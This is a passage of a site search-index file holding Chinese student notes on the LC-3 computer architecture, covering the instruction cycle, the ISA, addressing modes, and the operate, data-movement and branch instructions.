\u8fd9\u4e2a\u6307\u4ee4\u53ef\u80fd\u4f1a\u6539\u53d8PC\u7684\u5185\u5bb9\uff0c\u53d6\u51b3\u4e8e\u4e4b\u524d\u6307\u4ee4\uff08\u901a\u5e38\u662f\u524d\u4e00\u6761\u6307\u4ee4\uff09\u7684\u6267\u884c\u7ed3\u679c</p> <p>\u200b\u200b</p> <p>15\u4f4d\u523012\u4f4d \u64cd\u4f5c\u6570opcode 0000 11\u4f4d\u52309\u4f4d 101 \u662f\u5224\u65ad\u7684\u6761\u4ef6 101\u7684\u542b\u4e49\u5728\u4e8e\u5224\u65ad\u6700\u8fd1\u7684result\u662f\u5426\u662f0\u4ee5\u5916\u7684\u4e1c\u897f 8\u4f4d\u52300\u4f4d \u662faddress\u504f\u79fb\u91cf\uff0c\u7528\u4e8e\u5728\u6761\u4ef6\u5224\u65ad\u6b63\u786e\u7684\u65f6\u5019\u5c06\u5176\u6539\u5199\u5230PC\u4e0a\uff08\u4e0e\u5f53\u524dPC\u76f8\u52a0\uff09</p> <p>\u4f8b\u5982\u524d\u4e00\u4e2a\u64cd\u4f5c\uff08\u5047\u8bbe\u662f\u5728x36C8\uff09\u662fADD\uff0cADD\u7684\u7ed3\u679c\u662f0\uff0c\u90a3\u4e48\u8fd9\u4e2aBR\u5728excute\u9636\u6bb5\u5c31\u4e0d\u4f1a\u6267\u884c\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a\u64cd\u4f5c\u5c06\u4f1a\u6267\u884c x36CA\uff0c\u5982\u679cADD\u7684\u7ed3\u679c\u4e0d\u662f0\uff0c\u90a3\u4e48BR\u4f1a\u6267\u884c\uff0c\u90a3\u4e48\u4e0b\u4e00\u4e2a\u64cd\u4f5c\u4f1a\u6267\u884cx36C4</p> <p>ADD\uff08x36C8\uff09BR(x36C9)   BRfail\u540e\uff08x36CA\uff09 BRnotfail\u540e\uff08x36C4=x36CA-6\uff09</p> <p>control of the instruction cycle</p> <p>\u200b\u200b</p> <p>\u5982\u56fe\u662f\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u673a\u5728\u4e00\u4e2a\u6307\u4ee4\u5468\u671f\u5404\u4e2a\u8282\u62cd\u7684\u72b6\u6001</p> <p>state1 \u8981\u5b8c\u6210\u4e24\u4e2a\u64cd\u4f5c\uff1a 1.\u5c06PC\u5185\u5bb9\u52a0\u5165MAR\uff0c\u6709\u9650\u72b6\u6001\u673a\u8981\u63a7\u5236Gate PC \u548c LD.MAR\u4e24\u4e2a\u4fe1\u53f7 Gate PC\u5c06PC\u548cprocessor bus\uff08\u5904\u7406\u5668\u603b\u7ebf\uff09\u76f8\u8fde LD.MAR\u662fMAR\u7684\u53ef\u5199\u4fe1\u53f7\uff0c\u5728\u65f6\u949f\u5468\u671f\u7ed3\u675f\u540e\u628a\u6570\u636e\u52a0\u8f7d\u5230MAR\u4e2d 2. \u5c06PC\u52a0\u4e00\uff0c\u6709\u9650\u72b6\u6001\u673a\u901a\u8fc7PCMUX\u63a7\u5236+1\u529f\u80fd\u5355\u5143\u8f93\u51fa\uff0c\u800cLD.PC\u4fe1\u53f7\u63a7\u5236PC\u7684\u8f93\u5165</p> <p>state\u540e\u7eed\u7684\u72b6\u6001\u89c1\u4e66\u672c</p> <p>Halting the computer</p> <p>\u4f3c\u4e4e\u8ba1\u7b97\u673a\u7684\u8fd0\u884c\u65f6\u6c38\u4e0d\u505c\u6b62\u7684\uff0c\u6211\u4eec\u65e5\u5e38\u4f7f\u7528\u4e2d\u901a\u8fc7OS\u5173\u95ed\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709\u505c\u6b62\u8ba1\u7b97\u673a\u7684\u8fd0\u884c\uff0c\u56e0\u4e3a\u5bf9\u4e8e\u8ba1\u7b97\u673a\u800c\u8a00OS\u548c\u6211\u4eec\u521a\u521a\u5173\u6389\u7684\u7a0b\u5e8f\u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u4e00\u7cfb\u5217\u6307\u4ee4\u96c6\u5408\uff0c\u5728\u6307\u4ee4\u5c42\u9762\u4e0a\u8ba1\u7b97\u673a\u4ecd\u7136\u5728\u8fd0\u884c\u7740</p> <p>\u5f53\u6211\u4eec\u771f\u6b63\u8981\u505c\u6b62\u8ba1\u7b97\u673a\u65f6\uff0c\u9700\u8981\u5bf9clock\u8fdb\u884c\u64cd\u4f5c\uff0c\u65f6\u949fclock\u5c31\u662f\u673a\u5668\u5468\u671f\uff0c\u505c\u6b62\u4e86\u65f6\u949f\u5c31\u662f\u505c\u6b62\u4e86\u8ba1\u7b97\u673a\u7684\u6307\u4ee4\u8fd0\u884c</p> <p>the clock generator is a crystal oscillator\u65f6\u949f\u4fe1\u53f7\u53d1\u751f\u5668\u662f\u4e00\u4e2a\u6676\u4f53\u632f\u8361\u7ba1 \u6211\u4eec\u6709\u4e00\u4e2aRUN latch RUN\u9501\u5b58\u5668 \u5982\u679c\u5176\u8f93\u51fa\u4e3a1\uff0c\u5219\u65f6\u949f\u4fe1\u53f7\u4e0e\u65f6\u949f\u7535\u8def\u8f93\u51fa\u4e00\u76f4\uff0c\u82e5\u5176\u8f93\u51fa\u4e3a0\uff0c\u5219\u65f6\u949f\u4fe1\u53f7\u5230\u65f6\u949f\u7535\u8def\u7684\u901a\u8def\u88ab\u5207\u65ad\uff0c\u5219\u65f6\u949f\u7535\u8def\u8f93\u51fa\u4e3a0</p> <p>\u56e0\u6b64\u8981halt the computer\uff0c\u53ea\u8981\u6e05\u96f6RUN\u88c5\u586b\u5373\u53ef\uff0c\u5728LC-3\u4e0a\u540c\u5927\u591a\u8ba1\u7b97\u673a\u4e00\u6837\uff0c\u53ef\u4ee5\u901a\u8fc7OS\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#a-multiplication-algorithm","title":"A multiplication algorithm","text":""},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter-5-the-lc-3","title":"chapter 5 the LC-3","text":"<p>LC-3\u524d3000\u4f4d\u548c\u6700\u540e\u51e0\u4f4d\uff080xFE00 \u5230 0xFFFF\uff09\u662f\u4e0d\u80fd\u4f7f\u7528\u7684\u5185\u5b58\uff0c</p> <p>PSR\u5bc4\u5b58\u5668\u662f\u524d\u51e0\u4f4d\u662f\u770b\u4f60\u662f\u7528\u6237\u6a21\u5f0f\u8fd8\u662f\u7cfb\u7edf\u6a21\u5f0f\uff0c\u4e2d\u95f4\u51e0\u4f4d\u8868\u793a \u8fd0\u884c\u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7\uff0c\u6700\u540e\u4e09\u4f4d\u662fNZP</p> <p>JSR\u9002\u7528\u4e8e\u5b9e\u73b0\u9012\u5f52 RET(return)\u672c\u8d28\u662fJMP TRAP\u662f\u5207\u6362\u4e3a\u7cfb\u7edf\u6a21\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528\u524d\u4e09\u5343\u4f4d</p> <p>ACV\u68c0\u67e5\u662f\u5426\u5728\u8fd0\u884c\u5185\u5b58\u662f\u5426\u5728x3000\u4ee5\u524d</p> <p>we will point out more features of ISA of the LC-3 using these features to write programs in LC-3's own machine language</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#isa-overview","title":"ISA: overview\u6982\u8ff0","text":"<p>ISA\u5b9a\u4e49\u4e86\u8f6f\u4ef6\u7f16\u7a0b\u9700\u8981\u7684\u6240\u6709\u5fc5\u8981\u7684\u548c\u5b8c\u6574\u7684\u63cf\u8ff0\uff0c\u5b83\u5411\u7a0b\u5e8f\u5458\u63d0\u4f9b\u4e86\u6240\u6709\u5728\u4f7f\u7528\u8fd9\u53f0\u673a\u5668\u7684\u673a\u5668\u8bed\u8a00\u65f6\u9700\u8981\u7684\u4fe1\u606f\uff0c\u540c\u65f6\u5927\u591a\u7684ISA\u8fd8\u6307\u5b9a\u4e86\u5e0c\u671b\u7528\u9ad8\u7ea7\u8bed\u8a00\u7f16\u5199\u7a0b\u5e8f\u5e76\u4e14\u7ffb\u8bd1\u6210\u673a\u5668\u8bed\u8a00\u7684\u6240\u9700\u8981\u7684\u5185\u5bb9</p> <p>\u5177\u4f53\u6765\u8bf4\uff0cISA\u660e\u786e\u4e86\u4ee5\u4e0b\u5185\u5bb9\uff0cmemory organization, register set, and instruction set(including the opcodes, data types, and the addressing modes of the instructions in the instuction set) \u4e3b\u8981\u53ef\u4ee5\u5206\u4e3a\u5185\u5b58\u7ec4\u7ec7\u65b9\u5f0f\uff0c\u5bc4\u5b58\u5668\u7ec4\uff0c\u6307\u4ee4\u96c6</p> <p>\u5bf9LC-3\u7684\u8fd9\u4e9b\u65b9\u9762\u8fdb\u884c\u8bb2\u89e3</p> <p>memory organization LC-3\u7684address space is  2^16^ locations and its addressability of 16 bits \u8981\u6ce8\u610f\u7684\u662f\u8fd92^16^ \u7684\u7a7a\u95f4\u5e76\u4e0d\u662f\u90fd\u7528\u4e8e\u5185\u5b58\uff08\u540e\u7eed\u4f1a\u8fdb\u884c\u8bf4\u660e\uff09 \u6b63\u5e38\u7684\u4e00\u4e2a\u5185\u5b58\u5355\u5143\u670916bits\uff0c\u6570\u636e\u5904\u7406\u7684\u57fa\u672c\u5355\u4f4d\u4e5f\u662f16bits\uff0c\u5c0616bits\u8bb0\u4e3a\u4e00\u4e2aword, we called LC-3 is word-addressable</p> <p>register</p> <p>\u901a\u5e38\u800c\u8a00\u4ece\u5185\u5b58\u91cc\u83b7\u53d6\u6570\u636e\u4f1a\u76f8\u5bf9\u5730\u6ee1\uff0c\u4e00\u822c\u4f1a\u8d85\u8fc7\u4e00\u4e2aclock cycle LC-3\u50cf\u5927\u591a\u8ba1\u7b97\u673a\u4e00\u6837\u4f1a\u63d0\u4f9badditional temporary storage locations\uff0c\u4e5f\u5c31\u662fregister LC-3\u4e2d\u6709\u4e00\u7ec4general purpose register(GPR)\uff0c\u9700\u8981\u6309\u72ec\u4e00\u65e0\u4e8c\u5730\u5bfb\u5740\uff0c\u5728LC-3\u4e2d\u5c31\u662fR0\u5230R7 \u6309\u4e09\u4f4d\u5bfb\u5740\uff0c\u6bcf\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8\u4e00\u4e2aword\uff0c\u4e5f\u5c31\u662f16bits \u5728LC-3\u7684\u8fd9\u516b\u4e2aGPR\u4e2d\u4e00\u5f00\u59cb\u6709\u5404\u81ea\u7684\u5185\u5bb9\uff081 3 5 7 -2 -4 -6 -8\uff09\uff0c\u5c31\u662f\u6309\u7167\u4ed6\u4eec\u7684\u5bfb\u5740\u7801\u8fdb\u884c16\u4f4d\u7684sign-extending</p> <p>the instruction set</p> <p>\u6307\u4ee4\u96c6\u5305\u542b opcode and its operands \u64cd\u4f5c\u7801\u548c\u64cd\u4f5c\u5bf9\u8c61 \u5b83\u540c\u65f6\u5b9a\u4e49\u4e86opcode set, data type, and addressing modes</p> <p>\u4ee5ADD\u6307\u4ee4\u4e3a\u4f8b\uff0c\u5b83\u6709opcode ADD\uff0caddressing modes(register mode \u6709\u65f6\u8fd8\u4f1a\u6709immediate mode), and one data type(2's complement integer \u4e8c\u8fdb\u5236\u8865\u7801)</p> <p>LC-3\u7684opcode\u5305\u542b15\u6761\uff0c\u4e00\u5171\u53ef\u4ee5\u670916\u6761\uff0c\u5176\u4e2d1101\u8fd9\u4e2a\u64cd\u4f5c\u7801\u4e3a\u9884\u7559\u7684\uff0c\u672a\u5b9a\u4e49 \u672c\u8d28\u4e0a\u8fd9\u4e9b\u6307\u4ee4\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b operate\u8fd0\u7b97 data movement\u6570\u636e\u642c\u79fb control\u63a7\u5236 data movement\u5305\u62ec\u5728\u5185\u5b58\u548c\u5bc4\u5b58\u5668\uff0c\u5185\u5b58/\u5bc4\u5b58\u5668\u548c\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\u4e4b\u95f4\u8f6c\u79fb\u4fe1\u606f</p> <p>LC-3\u7684data type\uff0c\u7528\u4e8e\u63cf\u8ff0\u8fd9\u4e9bISA\u662f\u5982\u4f55\u7406\u89e3\u8fd9\u4e9b\u4fe1\u606f\u7684\uff0cLC-3\u53ea\u652f\u6301\u4e8c\u8fdb\u5236\u8865\u7801\uff1f</p> <p>LC-3\u7684Addressing mode\uff0c\u662f\u4e00\u79cd\u627e\u5bfboperand\u7684\u65b9\u5f0f\uff0c\u65e0\u975e\u662f\u4ece\u4e09\u4e2a\u5730\u65b9\u53bb\u627e\uff0c\u5185\u5b58\uff0c\u5bc4\u5b58\u5668\uff0c\u6307\u4ee4\u672c\u8eab\u7684immediate LC-3\u4f1a\u6709\u4e94\u79cdaddressing modes immediate\uff0c register\uff0c \u4e09\u79cd memory addressing modes\uff1aPC-relative\u76f8\u5bf9\u5bfb\u5740\uff0cindirect\u95f4\u63a5\u5bfb\u5740\uff0cBase+offset\u57fa\u5740\u504f\u79fb</p> <p>the condition code</p> <p>\u6761\u4ef6\u7801\uff0c\u6839\u636e\u4e4b\u524d\u6307\u4ee4\u7684\u6267\u884c\u7ed3\u679c\u6765\u6539\u53d8\u6307\u4ee4\u6267\u884c\u5e8f\u5217\uff0c\u901a\u8fc7\u6761\u4ef6\u7801\u6765\u5b9e\u73b0 LC-3\u4e2d\u67093\u4e2a\u4f4d\u5bc4\u5b58\u5668\uff0c\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e2d\u4ec5\u67091bit\uff0c\u5b83\u4eec\u5206\u522b\u662fN\uff0cZ\uff0cP</p> <p>\u6bcf\u5f53\u90a3\u516b\u4e2aGPR\u901a\u7528\u5bc4\u5b58\u5668\u53d1\u751f\u6539\u53d8\u7684\u65f6\u5019\uff0cNZP\u4e5f\u968f\u4e4b\u6539\u53d8\uff0c\u5f53\u5199\u5165\u7684\u662f\u6b63\u6570\u65f6 NZP\u88ab\u5199\u4e3a001\uff1b\u5199\u5165\u4e3a0\u65f6\uff0cNZP\u88ab\u5199\u4e3a010\uff1b\u88ab\u5199\u5165\u8d1f\u6570\u7684\u65f6\u5019\uff0cNZP\u88ab\u5199\u4e3a100</p> <p>\u6839\u636e\u8fd9\u4e09\u4e2a\u4f4d\u5bc4\u5b58\u5668\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u5224\u65ad\u662f\u5426\u8fdb\u884c\u6307\u4ee4\u6267\u884c\u5e8f\u5217\u7684\u6539\u53d8</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#operation-instruction","title":"operation instruction \u64cd\u4f5c\u6307\u4ee4\uff0c\u7b2c\u4e00\u7c7b\u6307\u4ee4","text":"<p>LC-3\u4ec5\u652f\u6301\u4e09\u79cd\u64cd\u4f5c\u6307\u4ee4\uff0cADD\uff0cAND\uff0cNOT \u6211\u4eec\u9010\u4e00\u8fdb\u884c\u4ecb\u7ecd  </p> <p>NOT</p> <p>not\u6307\u4ee4\u662f\u552f\u4e00\u7684\u5355\u64cd\u4f5c\u6570unary operation\u7684\u64cd\u4f5c\u6307\u4ee4</p> <p>1001 011 101 111111</p> <p>\u5bf916\u4f4d\u6e90\u64cd\u4f5c\u6570\u8fdb\u884c\u6309\u4f4d\u53d6\u53cd\uff0c\u53d6\u6570\u636e\u548c\u5b58\u6570\u636e\u8fdb\u884c\u7684\u90fd\u662f\u5bc4\u5b58\u5668\u5bfb\u5740\u6a21\u5f0f</p> <p>15\u4f4d\u523012\u4f4d 1001\u4e3a\u64cd\u4f5c\u7801 11\u4f4d\u52309\u4f4d 011\u4e3a\u76ee\u6807\u5bc4\u5b58\u5668 8\u4f4d\u52306\u4f4d 101\u4e3a\u6e90\u5bc4\u5b58\u5668 5\u4f4d\u52300\u4f4d \u90fd\u662f1</p> <p>\u200b\u200b</p> <p>\u5982\u56fe\u4e3aNOT\u7684data path</p> <p>ADD \u548c AND</p> <p>\u4e24\u8005\u7684\u6267\u884c\u975e\u5e38\u76f8\u4f3c\uff0c\u56e0\u6b64\u653e\u5728\u4e00\u8d77\u8bf4\u660e ADD\u7684\u64cd\u4f5c\u7801\u4e3a0001\uff0cAND\u7684\u64cd\u4f5c\u7801\u4e3a0101</p> <p>\u5b83\u4eec\u6709\u4e24\u4e2a\u64cd\u4f5c\u6570\uff0c\u4e0e\u4e4b\u524d\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u4eec\u53ef\u4ee5\u6709\u5176\u4e2d\u4e00\u4e2a\u64cd\u4f5c\u6570\u91c7\u7528\u5bc4\u5b58\u5668\u5bfb\u5740\u6216\u8005\u7acb\u5373\u6570\u5bfb\u5740\uff0c\u53e6\u4e00\u4e2a\u64cd\u4f5c\u6570\u548c\u76ee\u6807\u5fc5\u987b\u91c7\u7528\u5bc4\u5b58\u5668\u5bfb\u5740</p> <p>\u7acb\u5373\u6570\u5bfb\u5740\u65f6\uff0c\u5176\u7acb\u5373\u6570\u5b58\u50a8\u5728IR\u4e0a\uff0cIR\u662f\u5b58\u50a8\u6307\u4ee4\u7684</p> <p>0001 001 100 0 00 101  \u4e24\u4e2a\u64cd\u4f5c\u6570\u90fd\u662f\u5bc4\u5b58\u5668\u5bfb\u5740 0001 001 100 1 00001  \u4e00\u4e2a\u64cd\u4f5c\u6570\u662f\u5bc4\u5b58\u5668\u5bfb\u5740\uff0c\u53e6\u4e00\u4e2a\u64cd\u4f5c\u6570\u662f\u7acb\u5373\u6570\u5bfb\u5740 \u4e3b\u8981\u770b\u7b2c\u4e94\u4f4d</p> <p>\u200b\u200b</p> <p>\u200d</p> <p>\u4e4b\u524d\u63d0\u5230\u64cd\u4f5c\u6307\u4ee4\u53ea\u6709\u4e09\u4e2a</p> <p>\u4f46\u662f\u8fd8\u6709\u4e00\u4e2a\u6307\u4ee4LEA\uff0c\u628a\u5b83\u89c6\u4e3a\u64cd\u4f5c\u6307\u4ee4\u8fd8\u662f\u6570\u636e\u642c\u79fb\u6307\u4ee4\u90fd\u662f\u6709\u4e89\u8bae\u7684</p> <p>\u6240\u4ee5\u6211\u4eec\u5728\u8fd9\u91cc\u8ba8\u8bba\u5b83</p> <p>LEA\u7684\u64cd\u4f5c\u7801\u662f1110 \uff0c\u5b83\u91c7\u7528\u7684\u662f\u7acb\u5373\u6570\u5bfb\u5740</p> <p>1110 101 111111101 \u5176\u4f5c\u7528\u662f\u5bf9\u5bc4\u5b58\u5668\u505a\u521d\u59cb\u5316\uff0c\u5b83\u65e0\u9700\u8bbf\u95ee\u5185\u5b58\uff0c\u4f5c\u7528\u662f\u5c06\u4e00\u4e2a\u5730\u5740\u8bfb\u5165\u5bc4\u5b58\u5668\u4e2d 15\u4f4d\u523012\u4f4d 1110\u662f\u64cd\u4f5c\u7801 11\u4f4d\u52309\u4f4d 101\u662f\u76ee\u6807\u5bc4\u5b58\u5668 8\u4f4d\u52300\u4f4d\u662f\u4e00\u4e2a\u6570\u636e\uff0c\u5c06\u5176\u505asign-extending\u4e4b\u540e\uff0c\u4e0ePC\u503c\u76f8\u52a0\uff0c\u5b58\u5165101\u4e5f\u5c31\u662fR5\u4e2d  </p> <p>\u4ece\u4e0a\u8ff0\u64cd\u4f5c\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u6307\u4ee4\u53ea\u80fd\u628a\u79bb\u8fd9\u4e2a\u6307\u4ee4\u5f88\u76f8\u8fd1\u7684\u5730\u5740\u503c\u4f20\u5165\u5bc4\u5b58\u5668</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#data-movement-instruction","title":"data movement instruction","text":"<p>\u6570\u636e\u642c\u79fb\u6307\u4ee4\u57fa\u672c\u90fd\u8981\u8bbf\u95ee\u5185\u5b58\uff0c\u56e0\u6b64\u5176\u57fa\u672c\u6839\u636e\u4e09\u79cd\u5185\u5b58\u5bfb\u5740\u6a21\u5f0f</p> <p>\u6211\u4eec\u5c06\u6570\u636e\u4ece\u5185\u5b58\u8f6c\u5230\u5bc4\u5b58\u5668\u7684\u884c\u4e3a\u79f0\u4e3aload\uff0c\u5c06\u5bc4\u5b58\u5668\u8f6c\u5230\u5185\u5b58\u7684\u884c\u4e3a\u8bb0\u4e3astore</p> <p>\u6570\u636e\u642c\u79fb\u6307\u4ee4\u9700\u8981\u4e24\u4e2a\u64cd\u4f5c\u6570\uff0c\u6e90\u548c\u76ee\u7684\uff0c\u5176\u4e2d\u4e00\u4e2a\u5fc5\u987b\u662f\u5bc4\u5b58\u5668\uff0c\u53e6\u4e00\u4e2a\u662fIO/memory\uff0c\u8fd9\u91cc\u6682\u65f6\u53ea\u4ecb\u7ecdmemory\u4e5f\u5373\u5185\u5b58\u7684\u95ee\u9898</p> <p>\u57fa\u672c\u7684\u6307\u4ee4\u5f62\u5f0f\u662f 15\u4f4d\u523012\u4f4d\u662fopcode 11\u4f4d\u52309\u4f4d\u662f\u5bc4\u5b58\u5668DR\u6216\u8005SR 8\u4f4d\u52300\u4f4d\u662f\u5730\u5740\u751f\u6210\u5668address generation bits\uff0c\u57fa\u4e8e\u8fd99\u4f4d\u4fe1\u606f\u548c\u8be5\u6307\u4ee4\u7684\u5bfb\u5740\u6a21\u5f0f\u6765\u8ba1\u7b97\u51fa\u5185\u5b58\u7684\u5730\u5740 \u4e5f\u6839\u636e\u8fd9\u4e09\u79cd\u5bfb\u5740\u6a21\u5f0f\u6765\u4ecb\u7ecd\u8fd9\u4e9b\u6307\u4ee4</p> <p>PC-relative mode PC\u76f8\u5bf9\u5bfb\u5740</p> <p>\u6307\u4ee4LD\uff080010\uff09\u548cST\uff080011\uff09\u91c7\u7528\u7684\u662fPC\u76f8\u5bf9\u5bfb\u5740\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u5c068\u4f4d\u52300\u4f4d\u7684address generation bits\u4e0e\u5f53\u524d\u7684PC\u503c\u76f8\u52a0\uff0c\u6765\u5f97\u51fa\u76f8\u5e94\u7684\u5185\u5b58\u5730\u5740\uff0c\u8981\u6ce8\u610f\u6b64\u65f6\u7684PC\u662f\u5df2\u589e\u91cf\u7684</p> <p>\u5176\u4e2dLD\u505a\u7684\u662f\u8bfb\u53d6\u64cd\u4f5c\uff0cload\u7684\u7f29\u5199\uff0c\u628a\u5185\u5b58\u7684\u6570\u636e\u8bfb\u5230\u5bc4\u5b58\u5668\u4e2d \u76f8\u5bf9\u7684ST\u505a\u7684\u662f\u5b58\u5165\u7684\u64cd\u4f5c\uff0c\u662fstore\u7684\u7f29\u5199\uff0c\u628a\u5bc4\u5b58\u5668\u7684\u6570\u636e\u8bfb\u53d6\u5230\u5185\u5b58</p> <p>indirect mode \u95f4\u63a5\u5bfb\u5740</p> <p>\u6307\u4ee4LDI\uff081010\uff09\u548cSTI\uff081011\uff09\u91c7\u7528\u7684\u662f\u95f4\u63a5\u5bfb\u5740\uff0c\u8ba1\u7b97\u7684\u65b9\u5f0f\u4e0eLD\u548cST\u76f8\u540c\u90fd\u662f\u8ba1\u7b97 PC\u52a0\u4e0a\u504f\u79fb\u91cf\uff0c\u4f46\u662f\u5b9e\u9645\u53bbload\u548cstore\u7684\u4e1c\u897f\u662fPC+offset\u7684\u90a3\u4e2a\u5730\u5740\u91cc\u9762\u7684\u4e1c\u897f</p> <p>\u5c31\u662f\u628aPC\u76f8\u5bf9\u5bfb\u5740\u8bfb\u53d6\u6765\u7684\u4e1c\u897f\u4f5c\u4e3a\u5730\u5740\u8fdb\u884c\u5bfb\u5740\u3002\u6700\u597d\u7684\u6548\u679c\u5728\u4e8e\u5176\u6446\u8131\u4e86PC\u5bfb\u5740\u91cc\u6709\u9650\u7684\u5bfb\u5740\u8303\u56f4</p> <p>\u5176\u64cd\u4f5c\u7684\u987a\u5e8f\u4e3a\uff0c\u9996\u5148\u4ea7\u751f\u5730\u5740\uff0c\u5c06PC\u503c\u548cIR\u4e2d\u76848\u4f4d\u52300\u4f4d\u76f8\u52a0\uff0c\u5e76\u5c06\u7ed3\u679c\u5b58\u50a8\u5728MAR\uff0c\u8bfb\u53d6\u51fa\u6765\u5b58\u5230MDR\u4e0a\uff0c\u7136\u540e\u518d\u628aMDR\u4e0a\u7684\u6570\u636e\u5b58\u50a8\u5230MAR\uff0c\u6700\u540e\u624d\u8bfb\u53d6\u51fa\u6765\u5b58\u50a8\u5230MDR\u4e0a\uff0c\u518d\u8f6c\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e0a</p> <p>Base+offset Mode \u57fa\u5740\u504f\u79fb\u5bfb\u5740</p> <p>\u6307\u4ee4LDR\uff080110\uff09\u548cSTR\uff080111\uff09\u662f\u91c7\u7528\u57fa\u5740\u504f\u79fb\u7684\u5bfb\u5740\u6a21\u5f0f\uff0c\u5176\u6307\u4ee4\u7684\u7ec4\u6210\u6a21\u5f0f\u4e0e\u524d\u4e24\u8005\u6709\u6240\u4e0d\u540c</p> <p>LDR\uff1a 0110 001 010 011101</p> <p>\u6700\u540e\u516d\u4f4d\u662f\u5b83\u7684\u5730\u5740\u504f\u79fb\u91cf\uff0c-32\u523031 \u5176\u4e2d11\u4f4d\u52309\u4f4d 001\u662f\u76ee\u6807\u5bc4\u5b58\u5668 8\u4f4d\u52306\u4f4d 010\u4e5f\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u6839\u636e\u8fd9\u4e2a\u5bc4\u5b58\u5668\u5185\u7684\u6570\u636e\u4e0e\u504f\u79fb\u91cf\u76f8\u52a0\u5f62\u6210\u6240\u9700\u7684\u5730\u5740</p> <p>\u5c06\u5176\u88c5\u5165MAR\uff0c\u5bfb\u5740\uff0c\u5f97\u51fa\u7ed3\u679c\u52a0\u8f7d\u5230MDR\uff0c\u518d\u4f20\u5165\u76ee\u6807\u5bc4\u5b58\u5668</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#control-instruction","title":"control instruction","text":"<p>\u63a7\u5236\u6307\u4ee4\u53ef\u4ee5\u6253\u7834\u987a\u5e8f\u6267\u884c\uff0cLC-3\u4e2d\u6709\u4e94\u79cd\u64cd\u4f5c\u7801\u6765\u6539\u53d8\u8fd9\u4e2a\u987a\u5e8f\uff0c\u5206\u522b\u662f\u6761\u4ef6\u8df3\u8f6c\uff0c\u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u5b50\u7a0b\u5e8f\uff08\u51fd\u6570\uff09\u8c03\u7528\uff0cTRAP\uff0c\u4e2d\u65ad\u8fd4\u56de</p> <p>\u8fd9\u91cc\u53ea\u4ecb\u7ecd\u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u548c\u6761\u4ef6\u8df3\u8f6c</p> <p>\u6761\u4ef6\u8df3\u8f6c BR0000</p> <p>\u6307\u4ee4\u683c\u5f0f\u5982\u4e0b 0000 NZP PC\u504f\u79fb 11\u4f4d\u662fN 10\u4f4d\u662fZ 9\u4f4d\u662fP   8\u4f4d\u52300\u4f4d\u662fPC\u7684\u504f\u79fb NZP\u4e2d\u5982\u679c\u54ea\u51e0\u4f4d\u662f1\uff0c\u5c31\u68c0\u67e5\u90a3\u51e0\u4e2a\u4f4d\u5bc4\u5b58\u5668\uff0c\u88ab\u68c0\u67e5\u7684\u4f4d\u5bc4\u5b58\u5668\u4e2d\u53ea\u8981\u6709\u4e00\u4e2a\u662f1\uff0c\u5c31\u6267\u884c\uff0c\u5c06PC\u548cPC\u504f\u79fb\u76f8\u52a0\uff0c\u518d\u8986\u76d6\u76ee\u524d\u7684PC</p> <p>\u65e0\u6761\u4ef6\u8df3\u8f6c\u548c\u6761\u4ef6\u8df3\u8f6c\u7684\u64cd\u4f5c\u7801\u76f8\u540c\uff0c\u53ea\u4e0d\u8fc7\u628a11\u4f4d\u52309\u4f4dNZP\u5168\u5199\u4e3a1\uff0c\u90a3\u4e48\u5fc5\u7136\u4f1a\u8df3\u8f6c</p> <p>two methods of loop control</p> <p>JMP 1100</p> <p>1100 000 010 000000 \u8fd9\u91cc\u53ea\u67091100 \u548c 010\u662f\u6709\u542b\u4e49\u7684\uff0c010\u4ee3\u8868\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u5c31\u662f\u628a010\u5bc4\u5b58\u5668\u4e2d\u7684\u5730\u5740\u5b58\u5165PC\u4e2d\uff0c\u4ece\u800c\u8fbe\u5230\u5168\u8303\u56f4\u8df3\u8f6c\u7684\u76ee\u7684</p> <p>LAB\u673a\u5668\u7801 \u5199\u6ce8\u91ca\uff1b</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter-6-programming","title":"chapter 6 programming","text":"<p>in this chapter, we want to do two things: construct a program to solve program and fix this program</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#problem-solving","title":"problem solving","text":"<p>structured programming: 